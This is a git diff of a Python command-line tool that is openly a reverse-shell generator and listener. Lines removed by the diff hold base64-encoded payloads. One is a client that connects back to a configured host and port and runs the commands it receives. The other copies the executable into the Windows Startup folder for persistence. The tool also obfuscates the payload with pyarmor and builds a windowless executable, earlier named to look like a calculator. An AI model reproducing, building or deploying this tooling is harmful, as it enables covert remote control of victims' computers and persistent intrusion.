@@ -2,6 +2,7 @@ from modules.session import Session
 from modules.color import Color
 from rich.console import Console
 from rich.table import Table
+import shutil
 import subprocess
 import os
 import base64
@@ -9,10 +10,13 @@ import tempfile
 import platform
 import datetime
 import signal
+from modules.encode_base import EncodeBase
+
 variablesConfig: dict = {
     "session.lhost": "localhost",
     "session.lport": 4444,
     "generate.lhost": "localhost",
+    "generate.name": "payload",
     "generate.lport": 4444,
     "windows.autoexe.path": None,
 }
@@ -37,9 +41,14 @@ def help(_):
         table = Table(title=command, title_style="bold green", title_justify="start")
         table.add_column("Variable")
         table.add_column("Description")
+
         for var in data["vars"]:
             table.add_row(var, "variable configuration")
         table.add_row("Description", data["description"])
+        table.add_row("Platform", data["platform"])
+        if len(data["required"]) > 0:
+         table.add_row("Required", ','.join(data["required"]))
+        else: table.add_row("Required", "None")
         console = Console()
         console.print(table)
 
@@ -49,7 +58,7 @@ def start_session(command):
 
 
 def read_payload():
-        payload = base64.b64decode("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIENsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5wb3J0ID0gcG9ydAogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNlbGYuY2xpZW50LmNvbm5lY3QoKHNlbGYuaG9zdCwgc2VsZi5wb3J0KSkKCiAgICBkZWYgc2VuZChzZWxmOiBpc2luc3RhbmNlLCBkYXRhOiBieXRlcyk6CiAgICAgICAgc2VsZi5jbGllbnQuc2VuZChkYXRhKQoKICAgIGRlZiByZWNlaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNsaWVudC5yZWN2KDYwMDApCgoKY2xpZW50ID0gTm9uZQpkZWYgY29ubmVjdCgpOgogICAgZ2xvYmFsIGNsaWVudAogICAgd2hpbGUgY2xpZW50IGlzIE5vbmU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGllbnQgPSBDbGllbnQoJHtMSE9TVH0sICR7TFBPUlR9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgpjb25uZWN0KCkKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgY29tbWFuZCA9IGNsaWVudC5yZWNlaXZlKCkuZGVjb2RlKCkKICAgICAgICBpZiBjb21tYW5kIGlzIE5vbmU6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHNoZWxsPVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICApCiAgICAgICAgb3V0cHV0ID0gb3V0cHV0LnN0ZGVyciBpZiBvdXRwdXQuc3RkZXJyIGVsc2Ugb3V0cHV0LnN0ZG91dAoKICAgICAgICBpZiBvdXRwdXQgaXMgTm9uZSBvciBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgIG91dHB1dCA9ICJDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSIKCiAgICAgICAgY2xpZW50LnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBjbGllbnQgPSBOb25lCiAgICAgICAgY29ubmVjdCgpCiAgICAgICAgcGFzcwo=")
+        payload = base64.b64decode(EncodeBase.PAYLOAD_TYPE_SHELL)
         return (
             payload.decode()
             .replace("${LHOST}", f"'{variablesConfig["generate.lhost"]}'")
@@ -60,71 +69,81 @@ def generate(_):
   try:
     payload = read_payload()
     print(f"{Color.WARNING}Generating payload{Color.DEFAULT}")
-    with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
-        temp.write(payload)
-        temp.close()
 
-    print(f"{Color.OKGREEN}Obfuscating payload{Color.DEFAULT}")
+    temp = temp_file(payload)
 
-    flag = platform.system() == 'Windows' and subprocess.CREATE_NO_WINDOW or 0
+    encrypt_pyarmor(temp, "payload")
 
-    subprocess.run(["pyarmor", "gen", temp.name], stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL ,creationflags=flag)
-
-    ofuscated_path = os.path.join("dist", os.path.basename(temp.name))
+    ofuscated_path = os.path.join("dist", os.path.basename(temp))
 
     print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")
 
-    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=flag)
+    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=get_flag_system())
 
     print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")
 
     extension = ".exe" if platform.system() == 'Windows' else ""
+ 
+    name_file = variablesConfig["generate.name"]
 
-    fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-    namefile = os.path.join(os.getcwd(), f"calculator-{fileId}{extension}")
-
-    if(os.path.exists(ofuscated_path)):
-        os.rename(f"{ofuscated_path}{extension}", namefile)
-
-    if(os.path.exists(temp.name)):
-        os.remove(temp.name)
+    clear(temp, f"{name_file}-{get_id()}{extension}", extension)
 
     
   except Exception as e:
     print(f"{Color.FAIL}Error generating payload: {e}{Color.DEFAULT}")
-    pass
 
+def get_flag_system():
+    return platform.system() == 'Windows' and subprocess.CREATE_NO_WINDOW or 0
 
-def autoexe(_):
-     path = variablesConfig["windows.autoexe.path"]
-     if platform.system() != 'Windows':
-            print(f"{Color.FAIL}This command only works on Windows{Color.DEFAULT}")
-            return
-     if path is None:
-         print(f"{Color.FAIL}Path of .exe not set{Color.DEFAULT}")
-         return
-     nameFile = os.path.basename(path)
+def encrypt_pyarmor(path: str, name: str):
+    print(f"{Color.OKGREEN}Obfuscating {name}{Color.DEFAULT}")
 
-     payload = base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc2h1dGlsCmltcG9ydCBzeXMKdHJ5OgogICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgIT0gIldpbmRvd3MiOiBleGl0KCkKCiAgICBpZiBoYXNhdHRyKHN5cywgIl9NRUlQQVNTIikgaXMgRmFsc2U6IGV4aXQoKQogICAgCiAgICBleGVjdXRhYmxlID0gb3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgJyR7bmFtZUV4ZWN1dGFibGV9JykKICAKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKAogICAgICAgIG9zLmVudmlyb25bIkFQUERBVEEiXSwgIk1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXAiCiAgICApCgogICAgcHJpbnQoc3RhcnR1cF9mb2xkZXIpCgogICAgc3VicHJvY2Vzcy5Qb3BlbihbZXhlY3V0YWJsZV0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQoKICAgIHNodXRpbC5jb3B5KGV4ZWN1dGFibGUsIHN0YXJ0dXBfZm9sZGVyICsgIlxcIiArICcke25hbWVFeGVjdXRhYmxlfScpCgogICAgcHJpbnQoIkNsaWVudCBsYXVuY2hlZCBzdWNjZXNzZnVsbHkiKQoKCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIGV4aXQoKQo=")
-     payload = payload.decode().replace("${nameExecutable}", nameFile)
+    return subprocess.run(["pyarmor", "gen", path], stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL ,creationflags=get_flag_system())
 
-     with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
+def clear(temp: str, new_name: str, extension: str = ".exe"):
+    spec = ".spec"
+    path = os.path.join("dist", os.path.basename(temp) + extension)
+    if os.path.exists(path):
+        os.replace(path, new_name)
+    if os.path.exists(os.path.basename(temp) + spec):
+        os.remove(os.path.basename(temp) + spec)
+    if(os.path.exists(temp)):
+        os.remove(temp)
+    if os.path.exists("dist"):
+        shutil.rmtree("dist")
+    if os.path.exists("build"):
+        shutil.rmtree("build")
+
+def get_id():
+    return datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+def  get_payload(variable: str, value: str, payload: str):
+    payload_base64 = base64.b64decode(payload)
+    return payload_base64.decode().replace(variable, value)
+
+def temp_file(payload: str):
+    with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
         temp.write(payload)
         temp.close()
+    return temp.name
+def autoexe(_):
+     path = variablesConfig["windows.autoexe.path"]
+
+     name_file = path
+
+     payload = get_payload("${windows.autoexe.path}", name_file, EncodeBase.AUTOEXEC_PAYLOAD)
+   
+     temp = temp_file(payload)
 
      print(f"{Color.OKGREEN}Building autoexe{Color.DEFAULT}")
 
-     subprocess.run(["pyinstaller",f"--add-data {path};.", "--onefile","--noconsole", temp.name],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
+     output = subprocess.run(["pyinstaller","--hidden-import=win32timezone","--add-data", f"{path};.","--onefile", "--noconsole", temp],creationflags=get_flag_system())
 
-     fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-
-     namefile = os.path.join(os.getcwd(), f"autoexe-{fileId}.exe")
-
-     if(os.path.exists(temp.name)):
-        os.rename(f"{path}", namefile)
-        os.remove(temp.name)
-
+     if output.returncode != 0:
+        print(f"{Color.FAIL}Error building autoexe{Color.DEFAULT}")
+        return
+     
+     clear(temp, f"autoexe-{get_id()}.exe")
      print(f"{Color.OKGREEN}Autoexe generated successfully{Color.DEFAULT}")
 
 
@@ -139,29 +158,43 @@ commands = {
         "description": "Show help message",
         "vars": [],
         "action": help,
+        "platform": "all",
+        "required": [],
     },
     "generate": {
         "description": "Generate a reverse shell",
-        "vars": ["generate.lhost", "generate.lport"],
+        "vars": ["generate.lhost", "generate.lport", "generate.name"],
         "action": generate,
+        "platform": "all",
+        "required": [],
     },
     "execute": {
         "description": "Start a session",
         "vars": ["session.lhost", "session.lport"],
         "action": start_session,
+        "platform": "all",
+        "required": [],
     },
     "autoexe": {
         "description": "execute on startup",
         "vars": ["windows.autoexe.path"],
         "action": autoexe,
+        "platform": "Windows",
+        "required": ["windows.autoexe.path"],
     },
     "set": {
         "description": "Set a variable",
         "vars": ["variable", "value"],
         "action": set_var,
+        "platform": "all",
+        "required": [],
     },
 }
 
+def validate_vars(command):
+    for var in commands[command]["required"]:
+        if variablesConfig[var] is None: return False
+    return True
 
 load_banner()
 while True:
@@ -175,9 +208,16 @@ while True:
 
     search = command.split(" ")[0]
     if search in commands:
+        platformCommand = commands[search]["platform"]
+        if platformCommand != "all" and platform.system() not in platformCommand:
+            print(f"{Color.FAIL}Command not supported by the platform{Color.DEFAULT}")
+            continue
+        if not validate_vars(search):
+            print(f"{Color.FAIL}Variable not set in command {search}{Color.DEFAULT}")
+            continue
         commands[search]["action"](command)
     else:
         print(f"{Color.FAIL}Command not found{Color.DEFAULT}")
   except Exception as e:
         print(f"{Color.FAIL}Invalid syntax: {e}{Color.DEFAULT}")
-        pass
+        
